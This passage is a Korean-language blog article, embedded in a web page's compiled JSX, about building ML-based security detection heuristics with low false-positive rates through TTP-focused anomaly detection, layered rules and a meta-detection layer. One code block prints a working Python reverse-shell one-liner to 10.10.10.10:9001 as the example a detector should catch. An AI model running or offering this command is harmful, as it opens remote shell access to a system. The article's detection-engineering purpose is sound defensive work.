네트워크에서 이상을 감지하고, 이상한 명령 라인에 대해 경고하는 등의 작업을 요청합니다. 이러한 작업은 \\\"나를 위해 보안을 해결해줘\\\"라는 일반화 수준에 있습니다. 생산에서 잘 작동하지 않는 것이 놀라운 부분입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"실제로 많은 경우 ML은 정확히 우리가 요청한 대로 수행합니다. 예를 들어 IntelliJ가 자신을 업데이트하는 데 사용하는 이상한 elevator.exe 이진 파일을 보고할 수도 있으며, Spotify가 업데이트를 위해 사용하는 새로운 CDN에 대한 경고 또한 동일하게 Command and Control 콜백과 똑같이 랜덤하게 지연될 수 있습니다. 그리고 그 날에 이상했던 수백 가지 유사한 행동들.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"감독 학습의 경우에는 대규모의 레이블이 지정된 데이터 집합을 구성할 수 있는 경우(예: 악성 코드 탐지), EMBER와 같이 일반화가 잘 되는 모델링 체계를 구축할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"그러나 이러한 솔루션들에서도 — 정보 보안의 현대적인 AI 모델조차 아직 \\\"회색\\\" 영역을 파악하기에 충분한 컨텍스트를 보유하고 있지 않습니다. 예를 들어, TeamViewer를 나쁜 것인지 좋은 것인지 고려해야 하는가? 많은 중소기업이 저렴한 VPN으로 사용하고 있습니다. 동시에 이러한 소규모 기업 중 일부는 이러한 도구를 사용하여 대상 네트워크에 백도어로 접근하는 랜섬웨어 그룹일 수도 있습니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"머신 러닝이 보안 휴리스틱으로 성공한 사례\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"ML 기반 휴리스틱은 rule-based detection과 같은 이념을 따라야 합니다. 악의적인 TTP 집합에 초점을 맞추어야 합니다. 보안에 AI를 적용하려면 실제로 보안에 대한 지식과 직관이 필요하며, 데이터 과학자분들께 죄송하지만요. ¯_(ツ)_/¯ 적어도 오늘날에는 LLM이 다른 많은 작업에 이어 해결할 수 있는 폭넓은 일반화를 달성할 때까지 보안 문제를 해결할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"예를 들어, 명령줄에서 이상을 요청하는 대신 (이에 관한 결과가 이 글의 상단 그림 1에 표시된 것처럼 겸손한 크기의 데이터셋에서 634개의 이상으로 나타나는 것), 특정 공격 기법 주변의 베이스라인을 벗어난 활동을 요청해보세요. 즉, 이상한 Python 실행 (T1059.006)을 요청하고 바로 알아내세요! – 동일한 ML 알고리즘, 전처리 및 모델링 기술에 따르면, 실제로 Python 반전 셸인 유일한 이상을 발견할 수 있습니다:\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_3.png\",\n        alt: \"image\"\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"Unix에 중점을 둔 비지도 학습 기법 예시:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"이상한 python/perl/ruby 프로세스 (스크립팅 인터프리터를 통한 실행, T1059.006);\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"이상한 systemd 명령어 (systemd 프로세스를 통한 영속성, T1543.002);\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"고 심각도 점프박스로의 이상한 ssh 로그인 출처 (T1021.004).\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"Windows에 중점을 둔 비지도 학습 기법 예시:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"도메인 컨트롤러, MSSQL 서버에 로그인한 사용자의 이상 (T1021.002);\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"NTDLL.DLL을 로드하는 이상한 프로세스 (T1129);\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"이상한 RDP 클라이언트 및 서버 조합과의 네트워크 연결 (T1021.001).\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"기능적인 지도 학습 기준 예시:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"Reverse shell 모델: 알려진 방법을 활용하여 데이터셋의 악성 부분을 생성하십시오 (이와 같은 생성기에서 영감을 받으세요); 환경 텔레메트리에서 프로세스 생성 이벤트를 사용하여 데이터셋의 합법적인 대응물로 활용하십시오.\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"강력한 속임수에 대한 규칙을 머릿속에 만드는 대신, 아래의 그림 5에 나온 것과 같이 속임수에 대한 견고성을 고려한 별도의 기계 학습 모델을 구축하십시오 (스포일러: 성공할 수 없습니다). Mandiant의 이 주제에 대한 좋은 기사가 있습니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_4.png\",\n        alt: \"이미지\"\n      })\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"기계 학습은 서명 논리의 확장입니다\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"위의 예시들을 체계적으로 정리하면, ML 휴리스틱을 성공적으로 적용하는 데에는 다음 두 단계가 포함됩니다:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"특정 TTP에서 생성된 텔레메트리를 가능한 정확하게 포착할 수 있도록 입력 데이터를 좁힌 후;\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"비정상 활동을 찾기 위해 가능한 한 적은 차원을 정의합니다 (예: 프로세스 이미지만 볼 수 있는 논리는 부모 프로세스 이미지와 프로세스 인수를 추가로 볼 때보다 경보를 적게 발생시킵니다).\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"위의 단계 1은 사실 시그니처 규칙을 생성하는 방법입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"웹 셸 규칙을 활성화하기 전 \\\"보안 분석가들이 환경을 대표하는 모든 트리거를 걸러낸다\\\"고 이전에 얘기한 것을 기억하나요? 이것이 단계 2입니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"과거 사례에서 어떤 사람이 정당한 활동과 악의적인 활동 사이의 의사 결정 경계를 구축합니다. 사실 현대 ML 알고리즘은 여기에 정말 강합니다. ML 휴리스틱은 특정 TTP 주변의 대규모 정당한 활동을 수동으로 걸러내는 부담을 줄일 수 있습니다. 따라서 ML은 더 많은 작업 없이 시그니처 규칙보다 넓은 휴리스틱을 구축할 수 있게 합니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"스위스 치즈 모델\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이제 우리는 종합적인 비전을 개요로 설명할 준비가 되었습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"전통적인 탐지 엔지니어링 접근 방식은 SOC 대시보드가 넘치지 않도록 가능한 많은 시그니처 규칙을 쌓는 것입니다. 이러한 각 규칙은 높은 거짓 부정률 (FNR)을 가지지만 낮은 거짓 양성률 (FPR)을 가집니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"우리는 ML 휴리스틱을 계속 쌓아갈 수 있습니다. 이때 FPR에 대한 요구 사항은 낮아야 합니다. 왜냐하면 유일한 병목 현상을 보호해야 하기 때문입니다: 인간 분석가의 주의력입니다. ML 휴리스틱은 보안 엔지니어의 시간 자원을 크게 고갈시키지 않고 더 일반적인 행동 논리를 도입함으로써 규칙 기반 감지의 틈을 메울 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"만약 대부분의 낮은 hanging fruits를 다루었고 행동 분석에 더 깊게 집중하고 싶다면, 현재 활용 중인 것 위에 딥 러닝 논리를 추가할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_5.png\",\n        alt: \"ML heuristics\"\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"Occam의 면도날 원리를 기억하고, 가능한 간단하게 모든 새로운 휴리스틱을 구현하세요. 신호 규칙이 신뢰할 수 있는 기준선을 정의할 수 없는 경우에만 ML을 사용하십시오.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"예를 들어, 이전에 언급한 이상한 Python 실행과 관련해 — Python 아규먼트는 여전히 환경 내에서 너무 다양할 수 있어서 너무 많은 이상 활동에 대한 경고를 받을 수 있습니다. 더 좁혀서 특정해야 할 수도 있습니다. 예를 들어, 명령줄에 -c가 포함된 프로세스만 캡처하여 Python 바이너리에 인수로 전달된 코드를 찾는 경우에 사용할 수 있습니다. 따라서, 이러한 Python 역술술에만 집중하는 방법을 고려해볼 수 있습니다:\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"python -c \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.10.10\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"sh\\\")'\"\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FPR을 감소시키면 False-Negative가 증가합니다. 따라서, 특이한 이름을 가진 스크립트로부터 Python 실행을 놓칠 수 있습니다. 예를 들어, python fake_server.py와 같이 사용자가 도용한 가짜 서비스를 사용하는 공격자들이 사용할 수 있는 스크립트입니다. 이를 위해 이러한 TTP들의 하위 집합에 중점을 둔 FPR이 낮은 별도의 휴리스틱을 만들어보는 것이 좋을 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"메타-감지 계층\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"스위스 치즈 방법론을 따라도 상세한 휴리스틱을 얻게 됩니다. 보통 이러한 것들은 악의적인 의도를 나타내는 것은 아니지만 맥락에 관심이 있는 것입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"예를 들어, 새 소스에서 고심도 호스트로 SSH/RDP 로그인하는 것은 나쁜 것이 아닙니다(그냥 새 직원이나 워크스테이션일 수 있습니다), 또한 skilled 사용자 중에 whoami /all 실행이 일반적일 수 있습니다. 따라서 이러한 휴리스틱 모두 경보를 직접 트리거하기에 적합하지 않습니다. 그러나 두 가지의 조합은 분석가의 주의를 끌 수 있을지도 모릅니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 딜레마의 해결책은 \\\"True Positive Benigns\\\"를 생성하는 이러한 상세한 규칙 위에 추가적인 논리를 도입하는 것입니다. 우리는 이것을 메타-감지 계층이라고 부를 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_6.png\",\n        alt: \"아키텍처\"\n      })\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"룰 활성화 위에 적용되는 메타로직은 다양할 수 있지만 일반적으로 두 단계로 이뤄집니다:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"\\\"그룹화\\\": 모든 활성화를 \\\"엔티티\\\"별(예: 호스트, 사용자 이름, 소스 IP, 쿠키 등)로 그룹화합니다.\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"일정 기간 내의 활성화에 대한 \\\"집계 함수\\\"를 적용합니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"간단하면서도 기능적인 메타 탐지 로직의 예시:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"단일 엔티티(호스트 또는 사용자와 같은)에서 다른 룰 트리거의 수를 카운트하고, 세 시간 내에 세 가지 이상의 다른 룰이 트리거되면 보고합니다.\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"위와 동일하나, 심각성을 기준으로 룰에 가중치를 부여하고, \\\"중요\\\" 룰은 3으로, \\\"중간\\\"은 2로, \\\"정보\\\"는 1로 취급하여 임계값을 초과할 경우 보고합니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"더 정교한 방법들이 존재하는데, 저는 악성 코드 표현에 ML의 두 번째 층을 사용하는 AISec ’22 논문에 정의된 방법을 사용하고 있어요. 이들은 특정 어플리케이션과 환경에 튜닝되어야 해요. 왜냐하면 데이터 세부 정보, 텔레메트리 양 및 인프라 규모에 따라 다른 접근 방식이 필요해요. 이러한 접근 방식은 적절한 경고 한도를 유지하는 데 도움이 돼요.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"결론\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 기사에서 우리는 시그니처 방식을 넘어서 보안 작업 무기함을 확장하는 사고 방식에 대해 논의했어요. 대부분의 구현은 보안 전문가들이 기계 학습(ML)을 통한 행동 휴리스틱에 너무 광범위한 요구 사항을 정의하기 때문에 제대로 수행하지 못했어요.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"우리는 적절한 적용은 공격적인 기술, 전술 및 절차(TTPs)에 의해 이끌어져야 한다고 주장해요. 올바르게 사용될 때, ML 기술은 특정 TTP 주변의 합법적인 활동의 기준을 효율적으로 걸러내는 데 많은 인력을 절약할 수 있어요.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"성숙하고 성공적인 보안 체계는 시그니처와 행동 휴리스틱이 결합된 것으로 구성됩니다. 각각의 별도 검출 논리는 낮은 거짓 긍정률을 갖추고, 거짓 부정을 놓치지 않기 위한 제한 사항은 병렬로 여러 휴리스틱을 적용함으로써 균형을 이룹니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 글에서 사용된 예시는 전통적인 보안 운영에 적용될 경우 감지 엔지니어링 사례를 포함하고 있습니다. 그러나 우리는 같은 방법론이 제한적인 수정을 통해 다른 보안 응용프로그램에서도 유용할 것이라 주장합니다. 예를 들어, EDR/XDR 휴리스틱 공간, 네트워크 트래픽 분석 및 계산 등이 있습니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"추가 정보\"\n    }), \"\\n\", _jsx(_components.h2, {\n      children: \"기술 노트: 고정된 거짓 긍정률 하에서 검출률 추정\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"프로덕션 환경에서 행동 ML 휴리스틱 유틸리티를 평가하는 방법에 대한 코드 샘플이 포함된 공지입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"데이터 과학자 여러분 — 정확도, F1-스코어 및 AUC와 같은 지표는 보안 솔루션의 프로덕션 준비 상태에 대해 거의 알려주지 않습니다. 이러한 메트릭은 여러 솔루션이 얼마나 유용한지를 추론하는 데 사용될 수 있지만 절대적인 값을 제공하지는 않습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"보안 텔레메트리에서 발생하는 베이스 레이트 펄러시 때문에 이렇습니다 — 기본적으로 모델이 볼 수 있는 모든 데이터는 양성 샘플들입니다 (양성 샘플이 아닌 경우를 실제로 가리킴). 따라서 심지어 0.001%의 가짜 양성률이 있더라도 휴리스틱이 매일 10,000개의 확인을 수행한다면 하루에 10건의 경보를 생성할 것입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"모델의 유일한 실제 가치는 고정된 가짜 양성률(FPR) 하에서의 탐지율(즉, 실제 양성률, TPR)을 살펴보는 것으로 추정됩니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"아래 도표를 살펴봐주세요 — x축은 데이터 샘플의 실제 레이블을 나타냅니다. 이는 악성 또는 양성일 수 있습니다. y축에는 모델의 확률적 예측이 표시됩니다 — 샘플이 얼마나 나쁜 것으로 생각하는지입니다:\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_7.png\",\n        alt: \"Plot\"\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"만약 단 하나의 잘못된 경고만 허용된다면, 모델의 결정 임계값을 약 ~0.75(파선이 그어진 빨간 선)로 설정해야 합니다. 두 번째 잘못된 긍정 값(위양성) 바로 위에 있습니다. 따라서 모델의 현실적인 감지율은 약 50%입니다 (점선이 상자그림의 평균값과 거의 일치합니다).\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"변경 가능한 위양성율에 따른 감지율 평가는 아래의 코드 예시로 수행할 수 있습니다:\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-python\",\n        children: [_jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"# 코드 샘플\"\n        }), \"\\n\", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"def\"\n        }), \" \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"evaluate_detection_rates\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-params\",\n          children: \"y_true, preds\"\n        }), \"):\\n    \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"# 코드 구현 내용\"\n        }), \"\\n\"]\n      })\n    })]\n  });\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = Object.assign({}, _provideComponents(), props.components);\n  return MDXLayout ? _jsx(MDXLayout, Object.assign({}, props, {\n    children: _jsx(_createMdxContent, props)\n  })) : _createMdxContent(props);\n}\nreturn {\n  default: MDXContent\n};\n","frontmatter":{},"scope":{}}},"__N_SSG":true},"page":"/post/[slug]","query":{"slug":"2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate"},"buildId":"ll1cGyplNwh83dpggeai1","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>